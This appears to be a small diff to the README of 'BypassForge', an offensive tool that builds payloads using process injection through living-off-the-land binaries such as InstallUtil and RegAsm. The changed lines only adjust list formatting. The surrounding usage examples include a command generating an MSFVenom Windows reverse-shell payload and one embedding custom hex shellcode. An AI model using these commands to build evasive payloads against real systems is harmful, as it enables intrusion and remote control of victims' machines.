@@ -4,7 +4,7 @@ Generate Payloads utilizing Process Injection techniques for Living-off-the-Land
 # Example Usage
 The script can be used in two modes:
 - **MSF Mode**
-- 
+  
 Parameters like listener IP, listener port and MSF payload type are specified, based on which MSFVenom payload is generated and added to the final binary.
 ```
 python BypassForge.py -b InstallUtil,RegAsm -lh 127.0.0.1 -lp 8080 --payload windows/x64/shell_reverse_tcp
@@ -13,7 +13,7 @@ python BypassForge.py -b InstallUtil,RegAsm -lh 127.0.0.1 -lp 8080 --payload win
 
 
 - **Custom Shellcode Mode**
-- 
+  
 Custom shellcode which are created using 3rd party tools like micr0_shell (https://github.com/senzee1984/micr0_shell) or manually created is specified. This shellcode is added to the final payload binary.
 ```
 python BypassForge.py -b InstallUtil,RegAsm --custom --hex-shellcode 4831d265488b42604<SNIP>c9515151514989c84989c9ffd0
